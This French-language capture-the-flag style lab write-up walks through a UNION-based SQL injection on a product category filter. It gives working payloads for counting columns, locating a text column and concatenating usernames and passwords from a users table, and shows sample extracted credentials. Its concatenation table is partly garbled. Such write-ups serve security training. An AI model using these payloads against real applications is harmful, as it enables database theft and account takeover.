
## 🎯 Objectif du lab

L'application est vulnérable à une **SQL Injection dans le filtre de catégorie**.

Le but est :

extraire les usernames et passwords de la table users  
puis se connecter avec le compte administrator

---

# 🔎 Requête vulnérable

L’URL utilise un paramètre :

/filter?category=Gifts

Le backend exécute probablement une requête comme :

SELECT name, price  
FROM products  
WHERE category = 'Gifts'

---

# ⚔️ Étape 1 — Trouver le nombre de colonnes

Test avec `UNION SELECT` :

'+UNION+SELECT+NULL,NULL--

Résultat :

la requête accepte 2 colonnes

---

# ⚔️ Étape 2 — Identifier les colonnes textuelles

Test :

'+UNION+SELECT+NULL,'abc'--

Si `abc` apparaît dans la page :

la deuxième colonne accepte du texte

---

# ⚔️ Étape 3 — Récupérer les données de la table `users`

La base contient :

table : users  
colonnes : username , password

Mais **une seule colonne textuelle est affichée**, donc il faut concaténer.

---

# 🧠 Concaténation SQL

On utilise :

username||'~'||password

Signification :

username + "~" + password

Le `~` sert simplement de **séparateur**.

---

# ⚔️ Payload final

'+UNION+SELECT+NULL,username||'~'||password+FROM+users--

---

# 📊 Résultat affiché

La page renvoie :

administrator~s3cr3t  
carlos~pass123  
wiener~test123

---

# 🔐 Étape finale

Utiliser les identifiants :

username : administrator  
password : (celui affiché)

pour se connecter :

/login

---

# 🧠 Ce que ce lab enseigne

1️⃣ Trouver le **nombre de colonnes**

UNION SELECT NULL,NULL

2️⃣ Identifier la **colonne textuelle**

UNION SELECT NULL,'abc'

3️⃣ Extraire des données avec `UNION`

UNION SELECT username,password FROM users

4️⃣ Si une seule colonne texte est disponible :

concaténer les données

---

# 💡 Astuce importante

La concaténation dépend de la base SQL :

| base       | concaténation |
| ---------- | ------------- |
| Oracle     | `             |
| PostgreSQL | `             |
| MySQL      | `CONCAT()`    |

Exemple MySQL :

CONCAT(username,'~',password)

---

# 📌 Modèle mental SQLi UNION

Quand tu trouves une SQLi :

1️⃣ combien de colonnes ?  
2️⃣ quelle colonne affiche du texte ?  
3️⃣ quelles tables existent ?  
4️⃣ quelles colonnes existent ?  
5️⃣ extraire les données

---

✔️ Lab terminé : **extraction de données avec UNION SQLi**
